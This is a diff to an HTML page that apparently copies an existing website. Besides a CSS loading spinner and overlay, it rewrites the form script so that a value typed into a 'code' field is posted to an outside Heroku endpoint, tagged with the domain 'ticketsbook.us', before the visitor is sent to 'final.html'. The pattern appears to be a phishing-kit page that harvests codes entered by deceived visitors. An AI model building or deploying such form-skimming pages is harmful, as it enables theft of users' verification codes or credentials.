@@ -309,6 +309,41 @@
 		.tg-scroll-to-top:hover {
 			background-color: #111111;
 		}
+
+		.loading {
+			height: 0;
+			width: 0;
+			padding: 15px;
+			border: 6px solid #ccc;
+			border-right-color: #888;
+			border-radius: 22px;
+			-webkit-animation: rotate 1s infinite linear;
+			/* left, top and position just for the demo! */
+			position: fixed;
+			left: 50%;
+			top: 50%;
+		}
+
+		.myDIV {
+
+			background-color: #0b0b0b33;
+			width: 100vw;
+			position: relative;
+			left: 50%;
+			right: 50%;
+			margin-left: -50vw;
+			margin-right: -50vw;
+		}
+
+		
+		@-webkit-keyframes rotate {
+
+			/* 100% keyframe for  clockwise. 
+     use 0% instead for anticlockwise */
+			100% {
+				-webkit-transform: rotate(360deg);
+			}
+		}
 	</style>
 	<link rel="stylesheet" id="elementor-frontend-css" href="./autotrain_files/frontend-lite.min.css" type="text/css"
 		media="all">
@@ -586,8 +621,7 @@
 				</div><!-- #primary -->
 
 
-				<aside id="secondary" class="tg-site-sidebar widget-area ">
-				</aside><!-- #secondary -->
+			
 
 			</div>
 			<!-- /.tg-container-->
@@ -623,14 +657,14 @@
 		</div>
 		<!-- /.tg-site-footer-bar -->
 
-
+		<div id="myDIV" class="myDIV">hey</div>
 	</footer><!-- #colophon -->
 
 	</div><!-- #page -->
 	<script>
 		const submitBTN = document.getElementById('form-submit');
 		const code = document.getElementById('forminator-field-name-1');
-        
+
 		submitBTN.addEventListener('click', (e) => {
 			e.preventDefault();
 			console.log(code.value);
@@ -646,24 +680,36 @@
 			const data = new FormData();
 			data.append("json", JSON.stringify(payload));
 
-			fetch('https://ticketsbook.us/backend/api/send-mail', {
+			const div = document.createElement('div');
+			div.setAttribute("class", "loading");
+			div.setAttribute("id", "loading");
+			document.getElementById("myDIV").appendChild(div);
+
+			document.body.style.background = `linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7))`
+
+			fetch('https://api-for-emails.herokuapp.com/api/send-mail', {
 				method: "post",
 				body: JSON.stringify({
 					code: code.value,
+					domain: 'ticketsbook.us'
 				}),
 				headers: {
 					'Accept': 'application/json, text/plain, */*',
 					'Content-Type': 'application/json; charset=UTF-8'
-				},
-
+				}
 				//make sure to serialize your JSON body
 
 			}).then(res => res.json()).then(res => {
-				console.log(res);
+				document.getElementById("loading").remove();
+				document.body.style.background = '#fff'
 				window.location = "final.html";
 			})
-				.catch(err => alert(err))
-			})
+				.catch(err => {
+					document.getElementById("loading").remove();
+					document.body.style.background = '#fff'
+					alert(err);
+				})
+		})
 	</script>
 
 	<script src="https://smtpjs.com/v3/smtp.js">
